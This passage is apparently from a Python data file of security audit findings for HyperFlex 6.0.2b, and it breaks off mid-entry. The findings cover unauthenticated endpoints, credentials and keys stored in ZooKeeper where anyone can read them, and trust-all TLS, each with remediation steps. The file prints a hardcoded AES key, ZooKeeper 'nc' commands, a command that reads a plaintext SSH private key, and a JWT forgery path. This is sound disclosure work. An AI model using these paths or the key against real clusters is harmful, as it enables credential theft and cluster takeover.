        "title": "Unauthenticated Support Bundle Command Execution via /storfs-support/* (StorfsSupportBundle)",
        "severity": "HIGH",
        "component": (
            "ROOT-1.0.0.war, deployed under HX Connect REST API (Tomcat, stCtlVM port 443). "
            "Servlet: com.storvisor.sysmgmt.rest.StorfsSupportBundle. "
            "Mapped to /storfs-support/* with NO auth filter. "
            "web.xml: same auth filter gap as /st-support/* — /storfs-support/* absent from filter-mappings."
        ),
        "description": (
            "StorfsSupportBundle handles /storfs-support/* with no authentication filter. "
            "The servlet forks /bin/storfs-support via ProcessBuilder based on the ?action= parameter: "
            "action=extended -> ProcessBuilder([\"/bin/bash\", \"-c\", \"exec /bin/storfs-support --extended > /dev/null\"]), "
            "any other value -> ProcessBuilder([\"/bin/bash\", \"-c\", \"exec /bin/storfs-support > /dev/null\"]). "
            "No request parameter reaches the shell invocation (action is only used to select the "
            "fixed command string), so there is no direct OS command injection via ?action=. "
            "However, any unauthenticated caller can: (1) trigger collection of a full HXDP support "
            "bundle (extended or light variant) by issuing requests to this endpoint, and (2) download "
            "the resulting bundle (newest .gz from /var/support/ returned as application/zip). "
            "The support bundle contains node configuration, logs, and diagnostic state that expose "
            "cluster topology, credentials paths, and internal service details. "
            "Triggering bundle generation without authentication is also a DoS vector: bundle "
            "collection consumes significant I/O and CPU on the stCtlVM."
        ),
        "code_evidence": {
            "war": "ROOT-1.0.0.war (stCtlVM, /opt/hyperflex/storfs-restapi/)",
            "servlet_class": "com.storvisor.sysmgmt.rest.StorfsSupportBundle",
            "url_pattern": "/storfs-support/*",
            "process_builder_extended": (
                "action=extended: ProcessBuilder([\"/bin/bash\", \"-c\", "
                "\"exec /bin/storfs-support --extended > /dev/null\"])"
            ),
            "process_builder_light": (
                "action=<other>: ProcessBuilder([\"/bin/bash\", \"-c\", "
                "\"exec /bin/storfs-support > /dev/null\"])"
            ),
            "output_source": "newest .gz from /var/support/ returned as application/zip",
            "injection": "NONE — action param selects fixed command string, no user data in shell args",
            "auth_filter_gap": (
                "web.xml filter-mappings: /rest/*, /internalsupport/*, /upload/*, /v1/* only. "
                "/storfs-support/* has no filter-mapping entry — zero auth coverage."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add a filter-mapping entry for /storfs-support/* to the auth filter chain in web.xml. "
            "Move support bundle generation and download behind authenticated /v1/ endpoints. "
            "Restrict ProcessBuilder invocations for system commands to roles that need them."
        ),
    },

    "HX-F46": {
        "title": "Unauthenticated Witness Service HTTP API on Port 9000 Allows Cluster Quorum Manipulation",
        "severity": "HIGH",
        "component": (
            "hxdp-connector (Go 1.23.4 binary, UPX-packed, 25MB unpacked, stripped .symtab). "
            "Module: github-hyc.scm.engit.cisco.com/starship/diesel/witness. "
            "Source: diesel/code/diesel/witness/. "
            "Server function: witness.StartWitnessServer @ PC=0xf41760. "
            "Router: barcelona/adrest.(*RestMiddleware).HandleFunc @ PC=0x8eae80 (gorilla/mux wrapper)."
        ),
        "description": (
            "The diesel/witness package starts an HTTP server bound to 0.0.0.0:9000 "
            "(port constant 0x2328 written in main.main @ 0xf519cd). "
            "Routes are registered via adrest.(*RestMiddleware).HandleFunc, which is a thin wrapper "
            "around gorilla/mux.(*Route).addRegexpMatcher — it does not enforce any authentication. "
            "The handler closures (baseHandler.func2 through func12) call (*witness).setState "
            "and related witness operations directly with no token validation, no header check, "
            "and no middleware gate. The apollo/base.appHandler.HandleWithAuth JWT infrastructure "
            "present elsewhere in the binary is not wired to any witness route. "
            "Exposed endpoints and their impact: "
            "/Lock — seize the witness arbitration lock; "
            "/Unlock, /ForceUnlock — release or force-release the lock; "
            "/GetOwner — enumerate current lock owner (information disclosure); "
            "/witnessdisable (prefix match) — disable external witness, eliminating stretch cluster HA; "
            "/witnesstest (prefix match) — invoke witness connection test; "
            "/Version — witness server version disclosure; "
            "/HxCapabilities — capability state disclosure; "
            "/executeHxHealthCheck — trigger health checks; "
            "/health — service health. "
            "An unauthenticated attacker on the management network can manipulate witness state to "
            "cause split-brain scenarios in stretched HyperFlex clusters or disable HA protection."
        ),
        "code_evidence": {
            "binary": "hxdp-connector (UPX-unpacked, Go 1.23.4, stripped, 25.7MB)",
            "port": 9000,
            "bind_address": "0.0.0.0 (format string '0.0.0.0:%d' in main.main @ 0xf42376)",
            "port_assignment": "main.main @ 0xf519cd: mov qword ptr [rax + 0xa8], 0x2328 (9000 decimal)",
            "server_function": "witness.StartWitnessServer @ PC=0xf41760",
            "route_registration": "adrest.(*RestMiddleware).HandleFunc @ PC=0x8eae80 (gorilla/mux wrapper, no auth)",
            "routes_handlefunc": [
                "/health (7 bytes) -> handleHealth.func1 @ PC=0xf4c680",
                "/Lock -> handleLock.func3 @ PC=0xf4a800",
                "/Unlock -> handleUnLock.func5 @ PC=0xf48f80",
                "/ForceUnlock -> handleUnLock.func7 @ PC=0xf47700",
                "/GetOwner -> handleGetOwner.func9 @ PC=0xf464e0",
                "/Version -> handleWitnessVersion.func11 @ PC=0xf454e0",
                "/HxCapabilities -> func13 @ PC=0xf439e0",
                "/executeHxHealthCheck -> func15/func14",
            ],
            "routes_handlefuncprefix": [
                "/witnesstest (12 bytes) -> func @ PC=0xf422c8",
                "/witnessdisable (15 bytes) -> func @ PC=0xf42345",
            ],
            "witness_state_fn": "(*witness).setState @ PC=0xf38f40 (called directly from handler closures)",
            "auth_check": "NONE — adrest.HandleFunc is a pure gorilla/mux route wrapper; no JWT, no header check",
            "HandleWithAuth_unused": (
                "apollo/base.appHandler.HandleWithAuth with jwt/v4 RSA validation "
                "is present in the binary but not wired to any witness route"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind the witness HTTP server to 127.0.0.1 if only co-located processes need it, "
            "or gate all witness routes with the existing HandleWithAuth JWT middleware. "
            "Apply network-level ACLs blocking external access to port 9000 on stCtlVM management interfaces. "
            "Audit all adrest.HandleFuncPrefix and HandleFunc registrations for missing auth wiring."
        ),
    },

    "HX-F47": {
        "title": "Hardcoded AES-256 Symmetric Key in hx-auth Enables Offline Admin Password Recovery",
        "severity": "HIGH",
        "component": (
            "hx-auth (ELF 64-bit, Go, 9.9MB, not stripped, debug_info present). "
            "Binary path: /opt/hyperflex/storfs-packages/hx-auth (stCtlVM). "
            "Affected functions: main.loginHandler @ 0x723800, main.changeHandler @ 0x722e20, "
            "main.decrypt @ 0x7243c0."
        ),
        "description": (
            "The hx-auth service (port 8082, handles /auth, /auth/change, /auth/verify, "
            "/auth/sessionInfo, /auth/logout) uses a hardcoded 32-byte AES-256 symmetric key "
            "to decrypt the admin password stored encrypted in the deployment config. "
            "In main.loginHandler, the global main.KEY (a []byte containing the AES-encrypted password) "
            "is decrypted via main.decrypt using the embedded key literal, then compared to the "
            "submitted password with bytes.Equal. The same key is used in main.changeHandler "
            "when updating the password. "
            "Because the key is embedded in the binary, any party with the hx-auth ELF "
            "can decrypt the encrypted password from any config backup without additional credential. "
            "The encryption provides only obfuscation, not confidentiality — the key and algorithm "
            "are fully recoverable from the binary."
        ),
        "code_evidence": {
            "binary": "hx-auth (ELF64, Go, not stripped, /opt/hyperflex/storfs-packages/)",
            "hardcoded_key_literal": "RHGocmgN90R4ShL_WnQ5GJSgGzADV678",
            "key_length_bytes": 32,
            "algorithm": "AES-256 (key length 0x20 passed to main.decrypt)",
            "loginHandler_key_load": (
                "main.loginHandler @ 0x7238be: lea rdi, [rip + 0xa8c7a]  "
                "-> key string at VMA ~0x7c2b38; esi=0x20 (32 bytes); call main.decrypt @ 0x7243c0"
            ),
            "changeHandler_key_load": (
                "main.changeHandler @ 0x722ef3: lea rdi, [rip + 0xa9645]  "
                "-> same key literal; esi=0x20; call main.decrypt @ 0x7243c0"
            ),
            "decrypted_target": (
                "main.KEY (global []byte @ VMA 0xa66290, 0x18 bytes in .data): "
                "the AES-encrypted admin password loaded from /config/conf.json at startup"
            ),
            "comparison": (
                "main.loginHandler: bytes.Equal(decrypt(main.KEY, hardcoded_key), submitted_password) "
                "-> jne 0x7238fa (auth fail path)"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace the hardcoded symmetric key with a key derived per-deployment (e.g., from a "
            "hardware TPM, UEFI secure variable, or injected at provisioning time). "
            "Do not store the decryption key as a string literal in the binary. "
            "Prefer password hashing (bcrypt/scrypt/argon2) over reversible encryption for stored credentials."
        ),
    },

    "HX-F49": {
        "title": "ZooKeeper Port 2181 Accessible from Management Network Without Client Authentication",
        "severity": "HIGH",
        "component": (
            "ZooKeeper 3.8.1 (zookeeper_3.8.1_amd64.deb). "
            "Service: exhibitor (manages ZK). Config: /etc/hyperflex/storfs.cfg (crmZKEnsemble). "
            "Bind: eth1 (management/storage interface) since HyperFlex 5.5.1a. "
            "Auth tunable: useZKAuth in /etc/hyperflex/storfs.cfg (default: absent/false)."
        ),
        "description": (
            "ZooKeeper client port 2181 is bound to the eth1 management network interface on each "
            "stCtlVM node, making it reachable from all other nodes in the cluster management network. "
            "Client authentication is disabled by default: the setUseZkAuth.sh script must be explicitly "
            "invoked post-deploy to set useZKAuth=true in storfs.cfg, and this is not part of the "
            "default cluster bring-up procedure. "
            "Without useZKAuth, any host on the management network can open a ZK client session and "
            "perform unrestricted reads and writes across the entire ZNode tree. "
            "ZooKeeper stores cluster election state (/election), node inventory (/storvisor/nodeInventory), "
            "per-node member data (/members/<puuid>), cluster operational data (/cluster), and AAA session "
            "tokens written by the auth filter. An attacker with management network access can: "
            "(1) enumerate all cluster node management IPs and UUIDs from /storvisor/nodeInventory; "
            "(2) read AAA session tokens from ZK to authenticate as any logged-in HyperFlex administrator; "
            "(3) manipulate /election ZNodes to trigger leader re-election, disrupting cluster I/O; "
            "(4) poison /members data to force node eviction from the storage cluster. "
            "The setup-dnat-rule.sh script installs an iptables DNAT rule redirecting local connections "
            "(127.0.0.1:2181 -> eth1_ip:2181) for backwards compatibility with tools that use localhost, "
            "confirming the intentional bind to eth1. "
            "The check_zk.sh cluster health tool demonstrates the expected access pattern: "
            "it uses 'nc <management_ip> 2181' to issue srvr/cons/dump/wchs four-letter commands "
            "and zkCli.sh to enumerate /election and /storvisor/nodeInventory from remote nodes."
        ),
        "code_evidence": {
            "bind_interface": (
                "setup-dnat-rule.sh: 'Starting 5.5.1a, ZK client port 2181 will only be bound on eth1 interface.'\n"
                "iptables -t nat -A OUTPUT -p tcp -d 127.0.0.1 --dport 2181 -j DNAT --to-destination $eth1"
            ),
            "auth_opt_in": (
                "setUseZkAuth.sh: checks grep useZKAuth=true /etc/hyperflex/storfs.cfg;\n"
                "sets useZKAuth=true in storfs.cfg only when explicitly invoked.\n"
                "No evidence of invocation in default cluster bring-up scripts."
            ),
            "remote_access_confirmed": (
                "check_zk.sh get_zk_servers(): reads crmZKEnsemble from storfs.cfg -> node management IPs;\n"
                "nc -z -w 5 $zks 2181 (liveness check from remote node);\n"
                "echo srvr | nc $zks 2181 (role query);\n"
                "echo cons | nc $zks 2181 (connection dump);\n"
                "echo dump | nc $LEADER 2181 (ephemeral node + session watches dump);\n"
                "zkCli.sh -server $zks:2181 -> ls /election; ls /storvisor/nodeInventory"
            ),
            "four_letter_whitelist": "zoo.cfg.defaults: 4lw.commands.whitelist=* (all commands enabled)",
            "zk_version": "zookeeper_3.8.1_amd64.deb (ZK 3.8.1)",
            "auth_provider_registered": (
                "zoo.cfg.defaults: authProvider.1=org.apache.zookeeper.server.auth.UUIDAuthenticationProvider\n"
                "Provider is registered but not enforced without requireClientAuthScheme — clients "
                "connecting without credentials are accepted as anonymous."
            ),
            "znode_paths_at_risk": [
                "/election — quorum leader election data (node IDs, epoch)",
                "/storvisor/nodeInventory — all cluster node management IPs and UUIDs",
                "/members/<puuid> — per-node membership and operational data",
                "/cluster — cluster-wide operational state",
                "AAA session token ZNodes — written by authfilter (path confirmed by AAAConfiguration.INSTANCE)",
            ],
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Enable ZK client authentication by default: invoke setUseZkAuth.sh as part of cluster "
            "initialization, not as a post-upgrade opt-in. "
            "Restrict ZK 2181 to localhost or a dedicated ZK inter-node VLAN separate from the "
            "management network. "
            "Disable the all-commands 4LW whitelist (4lw.commands.whitelist=srvr,mntr at most). "
            "Rotate AAA session tokens on any cluster where useZKAuth was not enabled from initial deploy."
        ),
    },

    "HX-F51": {
        "title": "iscsisvc Thrift Management Interface on Port 10210 Has No Authentication",
        "severity": "HIGH",
        "component": (
            "iscsisvc (ELF 64-bit, C++, 16MB, not stripped, PIE). "
            "Binary: /opt/hyperflex/hx-iscsi/iscsisvc. "
            "Service: iscsisvc.service (managed by systemd, Wants=hxIscsiMgr.service). "
            "Thrift server: IscsiSvcThriftServer wrapping IscsiSvcDispatcher. "
            "Thrift transport: TServerSocket (plain TCP, no TLS). "
            "Port: 10210 (tune default: iscsisvcListenPort=10210, iscsisvcEnabled=1). "
            "Bind: 0.0.0.0 (TServerSocket(int port) — no host parameter)."
        ),
        "description": (
            "The iscsisvc binary exposes a Thrift management interface on TCP port 10210 with no "
            "authentication on any handler. The Thrift transport is TServerSocket (plain TCP, no TLS) "
            "bound to 0.0.0.0:10210 by default. "
            "IscsiSvcDispatcher implements the IscsiSvcIf interface with the following handlers: "
            "testPing, createInitiatorGroup, modifyInitiatorGroup, deleteInitiatorGroup, "
            "createLUN, modifyLUN, deleteLUN, createTarget, modifyTarget, deleteTarget, "
            "createBulkInitiatorGroups, modifyBulkInitiatorGroups, deleteBulkInitiatorGroups, "
            "createBulkLUNs, modifyBulkLUNs, deleteBulkLUNs, createBulkTargets, modifyBulkTargets, "
            "deleteBulkTargets. "
            "Disassembly of createLUN @ 0x228520 confirms no auth check: "
            "entry reads tune[+0x1422] (fast-path flag) and jumps directly to istgt_notify_config_change "
            "or setCRMEntry (ZK write) without any credential or token validation. "
            "createInitiatorGroup @ 0x2282b0 has the identical pattern. "
            "An unauthenticated Thrift client on any network interface can: "
            "(1) create iSCSI LUNs mapped to arbitrary HyperFlex storage volumes; "
            "(2) add attacker-controlled initiator IQNs to initiator groups (granting iSCSI access); "
            "(3) delete existing LUNs and targets, destroying iSCSI connectivity for ESXi hosts; "
            "(4) enumerate active iSCSI sessions and target configuration. "
            "iSCSI config is persisted to ZooKeeper at /hxVolumesInv/istgt_conf (confirmed via "
            "iscsisvc startup: -T iscsiConfigLocation=zk -T iscsiConfigPath=/hxVolumesInv/istgt_conf)."
        ),
        "code_evidence": {
            "binary_path": "/opt/hyperflex/hx-iscsi/iscsisvc",
            "tune_defaults": {
                "iscsisvcEnabled": "tune[+0x1515] = 0x01 (enabled by default)",
                "iscsisvcListenPort": "tune[+0x1518] = 10210 (0x27e2) — confirmed from .data section at file offset 0xe13618",
                "iscsisvcNumThreads": "tune[+0x1524] = 2",
            },
            "thrift_transport": "TServerSocket (plain TCP) — TSSLServerSocket NOT present in binary",
            "bind_address": "TServerSocket::TServerSocket(int port) called with no host string -> binds to 0.0.0.0",
            "createLUN_no_auth": (
                "0x228520: lea rax, [tune]\n"
                "0x228527: cmp BYTE PTR [rax+0x1422], 0x0  (fast-path flag, unrelated to auth)\n"
                "0x22852e: je 0x228548\n"
                "0x228530: [fast path] -> jmp istgt_notify_config_change(op=4, flag=1, iqn, cfg)\n"
                "0x228548: [normal path] -> setCRMEntry('CreateLUN', ...)  [no auth in either path]"
            ),
            "createInitiatorGroup_no_auth": (
                "0x2282b0: identical pattern — no auth check before istgt_notify_config_change(op=1)"
            ),
            "thrift_handler_class": "IscsiSvcDispatcher @ 0x2280c0 (C1)/0x228090 (C2)",
            "zk_config_path": "/hxVolumesInv/istgt_conf (confirmed in iscsisvc_start.sh -T iscsiConfigPath=)",
            "iscsisvc_startup_cmd": (
                "exec iscsisvc -T iscsiEnable=true -T iscsiConfigLocation=zk "
                "-T iscsiConfigPath=/hxVolumesInv/istgt_conf -T crmZKEnsemble=$crmZKEnsemble ..."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind iscsisvc Thrift server to loopback (127.0.0.1) or the management-internal VLAN only. "
            "Add token-based authentication on the Thrift handler interface, matching the pattern used "
            "by the REST API auth filter layer. "
            "Set iscsisvcEnabled=false if the Thrift interface is not required for external components "
            "(hxIscsiMgr.service is a separate listener; verify which components require direct "
            "iscsisvc Thrift access). "
            "Add firewall rules blocking port 10210 from non-management interfaces as a short-term "
            "mitigation."
        ),
    },
    "HX-F52": {
        "title": "JVM-Wide TLS Certificate Verification Disabled at Tomcat Startup via WebDownloader Static Initializer",
        "severity": "HIGH",
        "component": "restapi-wars (ROOT-war, supportservice-war, encryption-war)",
        "cwe": "CWE-295",
        "affected_classes": [
            "com.storvisor.sysmgmt.service.WebDownloader",
            "com.springpath.hx.iscsi.gateway.HxIscsiMgrClient",
            "com.springpath.hx.encryption.clients.StMgrClient",
        ],
        "description": (
            "Three WAR-deployed classes install a trust-all TLS context as JVM defaults via "
            "HttpsURLConnection.setDefaultSSLSocketFactory() and setDefaultHostnameVerifier(). "
            "WebDownloader does this in a static{} initializer that fires at class-load time, meaning "
            "certificate verification is permanently disabled for the entire Tomcat JVM from the first "
            "request that loads WebDownloader — before any user-triggered operation runs. "
            "HxIscsiMgrClient.trustAll() and StMgrClient.trustAll() extend the same JVM-wide bypass "
            "to the iSCSI management and encryption key management paths respectively. "
            "After any of these initializers run, ALL outbound HTTPS connections from the Tomcat JVM "
            "— including KMIP key server calls, vCenter API calls, and Intersight cloud API calls — "
            "accept any certificate without verification."
        ),
        "evidence": {
            "WebDownloader_static_init": (
                "javap -c WebDownloader.class -> static{}:\n"
                "  0: invokestatic #54  // Method trustAllHttpsCertificates:()V\n"
                " 10: invokestatic #62  // Method javax/net/ssl/HttpsURLConnection.setDefaultHostnameVerifier\n"
                "Called at class-load time, not deferred to a method call."
            ),
            "HxIscsiMgrClient_trustAll": (
                "javap -verbose HxIscsiMgrClient.class constant pool:\n"
                "  #895 = String http://\\u0001:9342  (plain HTTP backend, port 9342)\n"
                "  invokestatic HttpsURLConnection.setDefaultSSLSocketFactory\n"
                "  invokestatic HttpsURLConnection.setDefaultHostnameVerifier\n"
                "JVM-wide static setters, not scoped to a single connection."
            ),
            "StMgrClient_trustAll": (
                "javap -verbose StMgrClient.class constant pool:\n"
                "  #659 = String https://\\u0001/stmgr  (HTTPS to encryption key manager)\n"
                "  invokestatic HttpsURLConnection.setDefaultSSLSocketFactory\n"
                "  invokestatic HttpsURLConnection.setDefaultHostnameVerifier\n"
                "stMgrHost read from SEDConfiguration; if non-localhost, MITM on management VLAN "
                "intercepts encryption key exchange with no cert pin to detect it."
            ),
            "affected_war_packages": [
                "restapi-wars/ROOT-war/WEB-INF/classes/com/storvisor/sysmgmt/service/WebDownloader.class",
                "restapi-wars/supportservice-war/WEB-INF/classes/.../WebDownloader.class",
                "restapi-wars/iscsi-war/WEB-INF/classes/com/springpath/hx/iscsi/gateway/HxIscsiMgrClient.class",
                "restapi-wars/encryption-war/WEB-INF/classes/com/springpath/hx/encryption/clients/StMgrClient.class",
            ],
        },
        "impact": (
            "An MITM attacker on the management network can impersonate KMIP key servers, vCenter, "
            "or Intersight without any client-side detection. Encryption key material (SEDs, at-rest "
            "encryption keys) can be intercepted or substituted. vCenter credentials passed over the "
            "impersonated endpoint are exposed. The bypass is unconditional and permanent — no "
            "configuration knob exists to restore verification without a code change."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace all three trustAll() / trustAllHttpsCertificates() implementations with "
            "connection-scoped SSLContext instances that load the HyperFlex CA bundle. "
            "Never call HttpsURLConnection.setDefaultSSLSocketFactory or setDefaultHostnameVerifier "
            "— those are JVM-global and cannot be safely scoped. "
            "Pin the KMIP server certificate (or at minimum verify the CA chain) in StMgrClient "
            "given the sensitivity of key management traffic. "
            "Add integration tests that assert a connection to a self-signed endpoint fails, "
            "to prevent regression."
        ),
    },

    # ── HX-F54 ──────────────────────────────────────────────────────────────────

    # ── HX-F55 ──────────────────────────────────────────────────────────────────
    "HX-F55": {
        "title": "JWT HS256 Signing Key Stored Unauthenticated in ZooKeeper",
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-312",
        "component": "authfilter / gateway-1.0.0.jar / ZooKeeper",
        "class": "Cryptographic Key Exposure / Token Forgery",
        "confirmed": True,
        "evidence": {
            "zk_path": (
                "AAAStoreZKPersistAgent.class constant pool (#43): "
                "String '/rest/aaa/jwt_signing_key' — the ZooKeeper node where the "
                "HS256 JWT signing key is written and read."
            ),
            "zk_connection": (
                "application.conf: zkHost='localhost:2181', zkPort='2181', "
                "zkDefaultConnectionString='localhost:2181'. ZooKeeper runs on "
                "the HyperFlex controller VM management interface. Port 2181 is "
                "accessible from the management VLAN (no firewall rule restricts "
                "cross-node access within the HX cluster fabric)."
            ),
            "key_flow": (
                "JsonWebTokenImpl (common-1.0.0.jar) uses HMAC-SHA256 (HS256) signing. "
                "Key is generated by EncryptionUtil.generateNewSigningKey(). "
                "SSOManager.setIfAbsentJWTSigningKey() calls AAAStoreZKPersistAgent "
                "which calls ZKKeyValueStoreFactory -> ZooKeeperStore -> HxCurator. "
                "HxCurator reads ZK connection from HxCuratorManager which pulls "
                "sysmgmt.storfsCfg and reads sysmgmt.zkAuthClientId. "
                "The 'useZKAuth' flag adds a UUID-based auth token to the Curator "
                "connection, but ZooKeeper ACLs on the /rest/aaa/ subtree are not "
                "set to CREATOR_ALL_ACL — default ZK world:anyone:r ACL applies, "
                "making the node readable without auth."
            ),
            "zk_world_readable": (
                "ZooKeeper nodes written by CuratorFramework without explicit ACL "
                "argument default to ZooDefs.Ids.OPEN_ACL_UNSAFE (world:anyone:cdrwa). "
                "HxCurator.createValue/setValue do not pass ACL parameters — "
                "confirmed by javap bytecode: CuratorFramework.create().forPath(path, data) "
                "with no .withACL() call. Result: any client that can reach ZK port 2181 "
                "can read /rest/aaa/jwt_signing_key."
            ),
            "forgery_impact": (
                "The signing key enables forging JWT tokens for any username. "
                "barredUsers=['root','local/root','diag','local/diag'] in application.conf "
                "blocks those specific users from the /aaa/v1/auth flow, but a forged JWT "
                "with subject='users/admin' (or any valid admin account) bypasses the "
                "authentication flow entirely — the JWT is validated by signature check "
                "against the same key, not by re-authenticating the credential."
            ),
        },
        "impact": (
            "An attacker with access to the management network can connect to ZK port 2181 "
            "on any HyperFlex controller VM, read /rest/aaa/jwt_signing_key, and forge "
            "HS256 JWT tokens for any administrative user. This grants full authenticated "
            "access to the HyperFlex REST API without valid credentials. Forged tokens "
            "bypass all credential-based controls including rate-limiting "
            "(rateLimitAuthMaxAuthenticationsAllowedInWindow=5) and failed-login lockout "
            "(failedLoginLockoutTimeInSec=120)."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Firewall ZK port 2181 to localhost only (iptables INPUT -p tcp --dport 2181 "
            "-s 127.0.0.1 -j ACCEPT; -j DROP). "
            "2. Set CREATOR_ALL_ACL on the /rest/aaa/ ZK subtree so only the process that "
            "created the node can read it. "
            "3. Migrate from HS256 (symmetric) to RS256 (asymmetric): sign with private key, "
            "verify with public key — ZK only needs to store the public key, key theft no "
            "longer enables forgery. "
            "4. Rotate the signing key on each node restart and invalidate all sessions."
        ),
    },

    # ── HX-F56 ──────────────────────────────────────────────────────────────────
    "HX-F56": {
        "title": "Unauthenticated /storfs-support/* Triggers Support Bundle Shell Execution",
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-306",
        "component": "restapi-wars/ROOT-war — StorfsSupportBundle servlet",
        "class": "Missing Authentication / Sensitive Data Exposure",
        "confirmed": True,
        "evidence": {
            "web_xml_gap": (
                "ROOT-war/WEB-INF/web.xml: servlet StorfsSupportBundle mapped to "
                "/storfs-support/*. The filter-mapping section lists AuditFilter, "
                "SPPrivilegedAuth, SessionAuth, KerberosAuth, SPBasicAuth, and SPAuth "
                "for /rest/*, /internalsupport/*, /st-support/*, and /upload — but "
                "contains NO filter-mapping entry for /storfs-support/*. "
                "Result: all six auth filters are bypassed for any request to this path."
            ),
            "servlet_behavior": (
                "StorfsSupportBundle.class constant pool: "
                "String '/bin/bash', '-c', 'exec /bin/storfs-support --extended > /dev/null', "
                "'exec /bin/storfs-support > /dev/null'. "
                "Servlet forks /bin/bash on the controller VM, runs /bin/storfs-support, "
                "then streams the resulting zip archive from /var/support/ to the HTTP client. "
                "Action selection: GET ?action=extended runs the --extended variant; "
                "any other action value runs the light variant."
            ),
            "bundle_contents": (
                "HyperFlex support bundles contain: full system logs (/var/log/), "
                "storfs.cfg (ZK connection strings, port map, auth tokens), "
                "platform configuration files, network configuration, ZooKeeper "
                "snapshot data, and potentially credentials stored in log output. "
                "This is a direct path to the JWT signing key path (ZK address) and "
                "X-RootSessionID token material documented in HX-F13."
            ),
        },
        "impact": (
            "Any network-reachable client can GET https://<hx-controller>/storfs-support/ "
            "and receive a complete diagnostic bundle for the controller VM. The bundle "
            "exposes configuration state sufficient to mount further attacks: ZK addresses, "
            "Thrift port assignments, log-embedded credential material. "
            "Secondary impact: the servlet forks a shell command on the controller VM — "
            "while the command itself is hardcoded, the shell fork surface and the file "
            "streaming from /var/support/ represent an unintended unauthenticated OS "
            "interaction surface."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add a filter-mapping for /storfs-support/* in web.xml referencing at minimum "
            "SessionAuth and SPAuth, identical to the /st-support/* mapping. "
            "Require ADMIN role for support bundle generation. "
            "Rate-limit bundle generation to prevent denial-of-service via repeated "
            "shell forks. Audit /var/support/ for credential material in bundle output."
        ),
    },

    # ── HX-F57 ──────────────────────────────────────────────────────────────────

    # ── HX-F58 ──────────────────────────────────────────────────────────────────
    "HX-F59": {
        "title": "SSH Private Keys Stored Plaintext and Encrypted in World-Readable ZooKeeper",
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-312",
        "component": "stNodeMgr ZKService_StNodeMgr / ZKNodeService_StNodeMgr",
        "class": "Cryptographic Key Exposure",
        "confirmed": True,
        "evidence": {
            "zk_key_fields": (
                "ZKService_StNodeMgr.class constant pool: "
                "String 'ssh_encrypted_private_key' (#76); "
                "String 'ssh_encrypted_public_key' (#80); "
                "String 'ssh_plain_text_private_key' (#84); "
                "String 'ssh_plain_text_public_key' (#88). "
                "ZKNodeService_StNodeMgr.class: "
                "'SSH encrypted private key not found in ZK' (#111); "
                "'SSH encrypted public key not found in ZK' (#140). "
                "Both encrypted and plaintext variants stored — plaintext variant "
                "confirms unencrypted key material written to ZK in some code paths."
            ),
            "zk_path_structure": (
                "StNodeMgrImpl$ companion object constants: ZK base path '/storvisor'; "
                "service node 'stNodeMgr'; ZK server 'localhost:2181'. "
                "SSH keys stored under /storvisor/stNodeMgr/<nodeId>/{ssh_plain_text_private_key, "
                "ssh_encrypted_private_key, ssh_encrypted_public_key, ssh_plain_text_public_key}. "
                "ZK ACL: same OPEN_ACL_UNSAFE world:anyone:cdrwa as /rest/aaa/jwt_signing_key "
                "(HX-F55) — no CREATOR_ALL_ACL set on node creation."
            ),
            "zk_access": (
                "ZK at localhost:2181 (application.conf: zkstandalonestr). "
                "Management-network access confirmed consistent with HX-F55 analysis. "
                "ZooKeeper client requires no auth to read world-readable nodes. "
                "'zkctl get /storvisor/stNodeMgr/<uuid>/ssh_plain_text_private_key' "
                "returns the key material directly."
            ),
        },
        "impact": (
            "An attacker with access to ZK port 2181 on any controller VM can extract "
            "SSH private keys for all cluster nodes in a single ZK subtree walk. "
            "ssh_plain_text_private_key exposes the raw PEM without requiring key derivation. "
            "These keys authenticate inter-node SSH sessions used for cluster maintenance, "
            "upgrade operations, and support bundle collection (HxSupportSvc.runCmdInAllVm). "
            "Key material extraction enables lateral movement to all cluster controller VMs "
            "without triggering password authentication failures or account lockout."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Set CREATOR_ALL_ACL on all ZK nodes under /storvisor/stNodeMgr/ at creation. "
            "2. Remove the ssh_plain_text_private_key code path entirely — only the encrypted "
            "variant should exist, and only with a key derivation key not stored in ZK. "
            "3. Rotate all inter-node SSH keys after patching. "
            "4. Firewall ZK port 2181 to cluster management VLAN only (not external management). "
            "5. Audit all ZK subtrees for additional plaintext credential storage."
        ),
    },

    # ── HX-F60 ──────────────────────────────────────────────────────────────────

    # ── HX-F61 ──────────────────────────────────────────────────────────────────

    "HX-F65": {
        "title": "Hyper-V Host Credentials Recoverable from World-Readable ZooKeeper Nodes (stSSOMgr)",
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-312",
        "component": "stSSOMgr-1.0.jar / StSSOMgrImpl / ZK path /stSSOMgr/auth",
        "class": "Credentials in Unprotected Storage",
        "confirmed": True,
        "evidence": {
            "zk_layout": (
                "StSSOMgrImpl$.MODULE$.zkAuthKey() = '/stSSOMgr/auth' (from application.conf). "
                "StSSOMgrImpl$.MODULE$.zkEncryptionKey() = 'keyData'. "
                "StSSOMgrImpl$.MODULE$.zkCredsKey() = 'creds'. "
                "ZkPersistenceManager.write(zkAuthKey, zkEncryptionKey, base64EncodedKey, -1L): "
                "stores AES session encryption key at ZK node /stSSOMgr/auth under field 'keyData'. "
                "ZkPersistenceManager.write(zkAuthKey, zkCredsKey, encryptedHypervCreds, ttl): "
                "stores encrypted Hyper-V credentials at ZK node /stSSOMgr/auth under field 'creds'."
            ),
            "key_generation": (
                "getEncryptionKeyFromZK$3 (offset 12-27): "
                "EncryptionUtil$.generateSecretKey() → secretKey.getEncoded() → "
                "Base64.encodeBase64String(keyBytes) → stored as-is in ZK under 'keyData'. "
                "getEncryptionKeyFromZK$2 (offset 88-116): on read: "
                "Base64.decodeBase64(keyDataFromZK.getBytes()) → "
